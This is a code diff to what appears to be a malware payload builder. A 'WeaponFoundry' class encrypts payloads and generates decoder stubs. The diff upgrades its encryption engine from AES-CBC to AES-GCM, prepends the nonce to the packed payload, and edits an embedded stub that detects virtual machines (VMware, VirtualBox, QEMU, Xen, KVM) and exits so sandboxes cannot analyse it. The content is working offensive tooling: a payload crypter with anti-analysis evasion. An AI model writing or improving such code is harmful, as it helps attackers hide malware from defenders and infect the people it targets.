@@ -178,34 +178,40 @@ class EncryptionEngine:
         Returns:
             Tuple of (encrypted_data, iv)
         """
+    @staticmethod
+    def aes_encrypt(data: bytes, key: bytes, nonce: Optional[bytes] = None) -> Tuple[bytes, bytes, bytes]:
+        """
+        AES-256-GCM encryption (Strategic Hardened Upgrade).
+        
+        Args:
+            data: Data to encrypt
+            key: 32-byte key
+            nonce: 12-byte nonce (random if None)
+            
+        Returns:
+            Tuple of (encrypted_data, nonce, tag)
+        """
         try:
             from Crypto.Cipher import AES
-            from Crypto.Util.Padding import pad
         except ImportError:
             logger.warning("pycryptodome not installed, falling back to XOR")
-            return EncryptionEngine.xor_encrypt(data, key), b""
+            return EncryptionEngine.xor_encrypt(data, key), b"", b""
         
-        # Derive 32-byte key if needed
         if len(key) < 32:
             key = hashlib.sha256(key).digest()
         else:
             key = key[:32]
         
-        # Generate IV if not provided
-        if iv is None:
-            iv = os.urandom(16)
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        encrypted, tag = cipher.encrypt_and_digest(data)
         
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        encrypted = cipher.encrypt(pad(data, AES.block_size))
-        
-        return encrypted, iv
+        return encrypted, cipher.nonce, tag
     
     @staticmethod
-    def aes_decrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
-        """AES-256-CBC decryption"""
+    def aes_decrypt(data: bytes, key: bytes, nonce: bytes, tag: bytes) -> bytes:
+        """AES-256-GCM decryption"""
         try:
             from Crypto.Cipher import AES
-            from Crypto.Util.Padding import unpad
         except ImportError:
             return data
         
@@ -214,10 +220,8 @@ class EncryptionEngine:
         else:
             key = key[:32]
         
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        decrypted = unpad(cipher.decrypt(data), AES.block_size)
-        
-        return decrypted
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        return cipher.decrypt_and_verify(data, tag)
     
     def encrypt(
         self, 
@@ -255,8 +259,9 @@ class EncryptionEngine:
             return encrypted, key, None
         
         elif method == EncryptionMethod.AES:
-            encrypted, iv = self.aes_encrypt(data, key)
-            return encrypted, key, iv
+            encrypted, nonce, tag = self.aes_encrypt(data, key)
+            # Prepend tag to encrypted data for simplicity in storage
+            return tag + encrypted, key, nonce
         
         else:
             logger.warning(f"Unknown encryption method: {method}")
@@ -367,13 +372,13 @@ def _vm():
     try:
         o=subprocess.check_output("systemd-detect-virt",stderr=subprocess.DEVNULL).decode().strip()
         return o not in ["none",""]
-    except: pass
+    except Exception: pass
     try:
         with open("/sys/class/dmi/id/product_name") as f:
             p=f.read().lower()
             for v in ["vmware","virtualbox","qemu","xen","kvm"]:
                 if v in p: return True
-    except: pass
+    except Exception: pass
     return False
 if _vm(): import sys; sys.exit(0)
 '''
@@ -534,10 +539,10 @@ class WeaponFoundry:
                 payload_bytes, encryption, key
             )
         
-        # IV is required for decryption but currently not embedded in the decoder stub
-        # TODO: Pass IV to _generate_decoder or prepend to payload
+        # Prepend IV to payload if exists (Standard for block ciphers like AES)
         if iv:
-            logger.debug(f"Encryption IV generated: {iv.hex() if iv else 'None'}")
+            payload_bytes = iv + payload_bytes
+            logger.debug(f"Encryption IV prepended to payload: {iv.hex()}")
         
         # Generate decoder stub
         decoder_stub = self._generate_decoder(encryption, key, format)
